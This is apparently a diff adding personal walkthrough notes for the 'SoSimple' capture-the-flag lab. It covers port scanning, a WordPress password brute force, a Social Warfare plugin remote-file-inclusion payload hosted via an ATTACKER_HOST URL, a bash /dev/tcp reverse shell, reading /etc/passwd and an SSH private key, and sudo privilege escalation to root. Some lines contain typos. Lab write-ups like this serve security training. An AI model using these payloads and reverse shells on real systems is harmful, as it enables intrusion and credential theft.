@@ -1,0 +1,82 @@
+SoSimple
+
+ping 192.168.210.78
+nmap -sC -sV -Pn 192.168.210.78
+
+22
+80
+
+feroxbuster -u http://192.168.210.78 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
+
+http://192.168.210.78/wordpress/
+
+For this particular scan, you have to get your own API key from https://wpvulndb.com/api register to get your api-token and limited scan/day.
+
+wpscan --url http://192.168.210.78/wordpress/ 
+wpscan --url http://192.168.210.78/wordpress/ -e u
+
+admin
+max
+
+wpscan --url http://192.168.210.78/wordpress/ -U max -P /usr/share/wordlists/rockyou.txt
+
+[!] Valid Combinations Found:
+ | Username: max, Password: opensesame
+
+https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618
+
+social-warfare exploit 
+
+https://www.exploit-db.com/exploits/46794
+
+Exploitation:
+
+1. Create payload file and host it on a location accessible by a targeted website. Payload content : "<pre>system('cat /etc/passwd')</pre>"
+2. Visit http://WEBSITE/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://ATTACKER_HOST/payload.txt
+3. Content of /etc/passwd will be returned 
+
+echo "<pre>system('cat /etc/passwd')</pre>" > payload.txt
+python3 -m http.server 80
+
+http://192.168.167.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.49.167/payload.txt
+
+https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+bash
+
+bash -i >& /dev/tcp/192.168.49.167/8080 0>&1
+
+To execute it in a PHP format I had to change the payload to:
+
+<pre>system("bash -c 'bash -i >& /dev/tcp/192.168.49.167/8080 0>&1'")</pre>
+
+ERROR
+
+<pre>system("cat /home/max/.ssh/id_rsa")</pre>
+
+cd /home/max
+
+cat user.txt
+cd .ssh
+cat id_rsa
+
+chmod 600 id_rsa
+
+ssh -i id_rs max@IP
+
+sudo -l
+sudo -u steven /usr/sbin/service ../../bin/bash
+
+cd /home/steven
+cat user2.txt
+
+ So I created a directory /opt/tools and a script server-health.sh with the following code:
+
+#
+!/bin/bash
+bash
+
+sudo -u root /opt/tools/server-health.sh
+
+cd /root
+cat flag.txt
